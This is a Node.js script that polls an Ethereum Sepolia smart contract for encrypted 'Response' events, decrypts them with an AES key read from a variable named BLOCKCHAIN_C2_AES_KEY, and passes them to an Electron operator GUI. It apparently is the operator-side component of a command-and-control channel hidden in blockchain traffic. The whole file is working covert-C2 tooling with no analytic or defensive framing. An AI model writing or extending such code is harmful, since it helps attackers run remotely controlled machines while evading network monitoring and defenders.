/**
 * Blockchain Response Poller - Polls for Response events from client
 * 
 * This polls the blockchain contract for Response events (client -> operator)
 * and processes them similar to how Socket.IO responses are handled
 * 
 * Usage:
 *   node blockchain-response-poller.js
 * 
 * Or integrate into Electron GUI
 */

const { ethers } = require('ethers');
const crypto = require('crypto');

// Configuration
const DEFAULT_RPC = process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com';
const RPC_URLS = [
    DEFAULT_RPC,
    'https://rpc.sepolia.org',
    'https://ethereum-sepolia.blockpi.network/v1/rpc/public'
];
if (process.env.INFURA_PROJECT_ID) {
    RPC_URLS.push(`https://sepolia.infura.io/v3/${process.env.INFURA_PROJECT_ID}`);
}
const RPC_URL = RPC_URLS[0];
const CONTRACT_ADDRESS = process.env.BLOCKCHAIN_CONTRACT_ADDRESS || '0x0000000000000000000000000000000000000000';
const AES_KEY_HEX = process.env.BLOCKCHAIN_C2_AES_KEY || '';

// Contract ABI (for Response event)
const CONTRACT_ABI = [
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": false,
                "internalType": "bytes",
                "name": "encrypted",
                "type": "bytes"
            }
        ],
        "name": "Response",
        "type": "event"
    }
];

// AES-256-GCM decryption
function decrypt(encryptedHex, keyHex) {
    const key = Buffer.from(keyHex, 'hex');
    const encrypted = Buffer.from(encryptedHex, 'hex');
    
    if (encrypted.length < 12 + 16) {
        throw new Error('Encrypted data too short');
    }
    
    const iv = encrypted.slice(0, 12);
    const tag = encrypted.slice(-16);
    const ciphertext = encrypted.slice(12, -16);
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(tag);
    
    let decrypted = decipher.update(ciphertext);
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    
    return decrypted.toString('utf8');
}

// Poll for Response events
async function pollResponses(fromBlock = null) {
    try {
        // Create provider
        let provider = null;
        for (const rpcUrl of RPC_URLS) {
            try {
                provider = new ethers.JsonRpcProvider(rpcUrl, {
                    name: 'sepolia',
                    chainId: 11155111
                }, {
                    staticNetwork: true
                });
                await provider.getBlockNumber();
                break;
            } catch (error) {
                continue;
            }
        }
        
        if (!provider) {
            console.error('All RPC endpoints failed');
            return;
        }
        
        const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, provider);
        
        // Get latest block
        const latestBlock = await provider.getBlockNumber();
        const startBlock = fromBlock || Math.max(0, latestBlock - 100); // Check last 100 blocks or from specified block
        
        console.log(`Polling for Response events from block ${startBlock} to ${latestBlock}...`);
        
        // Filter for Response events
        const filter = contract.filters.Response();
        const events = await contract.queryFilter(filter, startBlock, latestBlock);
        
        if (events.length === 0) {
            console.log('No Response events found');
            return;
        }
        
        console.log(`Found ${events.length} Response event(s)`);
        
        const responses = [];
        
        for (const event of events) {
            try {
                const encryptedHex = event.args[0];
                const encrypted = encryptedHex.substring(2); // Remove 0x prefix
                
                // Decrypt response
                const decrypted = decrypt(encrypted, AES_KEY_HEX);
                const response = JSON.parse(decrypted);
                
                console.log(`\nResponse received:`);
                console.log(`  Event: ${response.event}`);
                console.log(`  Data:`, JSON.stringify(response.data, null, 2));
                console.log(`  Timestamp: ${new Date(response.timestamp).toISOString()}`);
                
                responses.push({
                    event: response.event,
                    data: response.data,
                    timestamp: response.timestamp
                });
                
                // Emit to Electron GUI (similar to Socket.IO)
                // This would integrate with the Electron app's event system
                if (typeof process !== 'undefined' && process.send) {
                    process.send({
                        type: 'blockchain-response',
                        event: response.event,
                        data: response.data
                    });
                }
                
            } catch (error) {
                console.error('Error processing response:', error.message);
            }
        }
        
        return responses;
        
    } catch (error) {
        console.error('Error polling responses:', error);
    }
}

// Poll every 60 seconds
if (require.main === module) {
    console.log('Blockchain Response Poller');
    console.log(`Contract: ${CONTRACT_ADDRESS}`);
    console.log(`Polling every 60 seconds...\n`);
    
    // Initial poll
    pollResponses();
    
    // Poll every 60 seconds
    setInterval(pollResponses, 60000);
}

module.exports = { pollResponses };
